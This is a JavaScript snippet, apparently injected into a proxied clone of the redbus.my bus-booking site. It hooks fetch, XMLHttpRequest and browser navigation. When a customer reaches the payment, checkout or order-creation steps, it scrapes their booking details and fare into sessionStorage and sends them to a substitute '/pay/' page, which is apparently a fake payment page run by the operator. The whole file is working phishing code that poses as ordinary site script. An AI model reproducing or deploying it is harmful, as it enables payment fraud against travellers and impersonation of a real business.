(function(){
  'use strict';

  // Redirect API calls to redbus.my directly (proxy can't forward POST bodies)
  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    if (typeof input === 'string') {
      input = input.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
      if (isApiPath(input)) input = 'https://www.redbus.my' + input;
    }
    return _fetch.call(window, input, init);
  };
  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') {
      url = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
      if (isApiPath(url)) url = 'https://www.redbus.my' + url;
    }
    return _origOpen.call(this, method, url);
  };
  function isApiPath(p) {
    p = p.split('?')[0];
    return p.indexOf('/redPay/') !== -1;
  }

  // Intercept page navigation to payment → redirect to /pay/
  function checkPayUrl(url) {
    if (typeof url === 'string') {
      var p = url.split('?')[0];
      if (p.indexOf('/paymentDetails') !== -1 || p.indexOf('/payment') !== -1 || p.indexOf('/checkout') !== -1) {
        var bookingData = extractBookingData();
        if (bookingData) {
          try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
          return '/pay/';
        }
      }
    }
    return url;
  }
  var _ps = history.pushState;
  history.pushState = function(s, t, u) { u = checkPayUrl(u); return _ps.call(this, s, t, u); };
  var _rs = history.replaceState;
  history.replaceState = function(s, t, u) { u = checkPayUrl(u); return _rs.call(this, s, t, u); };
  try {
    var _assign = location.assign.bind(location);
    location.assign = function(u) { return _assign(checkPayUrl(u)); };
  } catch(e) {}
  try {
    var _rep = location.replace.bind(location);
    location.replace = function(u) { return _rep(checkPayUrl(u)); };
  } catch(e) {}

  // Intercept payment API calls (URLs may be relative or absolute)
  var _origFetch2 = window.fetch;
  window.fetch = function(input, init) {
    if (typeof input === 'string') {
      var p = input.split('?')[0];
      if (p.indexOf('/createOrder') !== -1 || p.indexOf('/orderInfo') !== -1 || p.indexOf('/placeOrder') !== -1 || p.indexOf('/saveBooking') !== -1 || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/paymentInit') !== -1) {
        console.log('[Redbus Pay] Intercepted:', p);
        var bookingData = extractBookingData();
        if (bookingData) {
          try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
          window.location.href = '/pay/';
          return new Promise(function() {});
        }
      }
    }
    return _origFetch2.call(window, input, init);
  };

  function extractBookingData() {
    var data = {};
    try {
      var store = window.__REDUX_STORE__ || window.__store || window.store;
      if (store) {
        var state = store.getState ? store.getState() : (store.state || {});
        if (state.search && state.search.searchResults) {
          var r = state.search.searchResults;
          data.origin = r.fromCityName || '';
          data.destination = r.toCityName || '';
          data.departureDate = r.doj || r.onward || '';
          data.pax = r.passengerCount || 1;
          data.productType = 'Bus';
        }
      }
    } catch(ex) {}
    try {
      var pd = window.pageData || {};
      data.origin = data.origin || pd.fromCity || '';
      data.destination = data.destination || pd.toCity || '';
    } catch(ex) {}
    if (!data.origin) {
      var sp = new URLSearchParams(location.search);
      data.origin = sp.get('fromCityName') || '';
      data.destination = sp.get('toCityName') || '';
      data.departureDate = sp.get('onward') || sp.get('doj') || '';
    }
    if (!data.productType) data.productType = 'Bus';
    if (!data.currency) data.currency = 'MYR';
    try {
      var priceEls = document.querySelectorAll('[class*="fare"], [class*="price"], [class*="total"], [class*="amount"], [class*="Fare"]');
      for (var i = 0; i < priceEls.length; i++) {
        var pt = priceEls[i].textContent || '';
        var pm = pt.match(/[RM$MYR]?\s*([\d,]+\.?\d*)/);
        if (pm) { data.amount = pm[1].replace(/,/g, ''); data.currencySymbol = 'MYR'; break; }
      }
    } catch(ex) {}
    return data;
  }

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}body.modal-open{overflow:auto!important}';
  document.head.appendChild(style);
})();
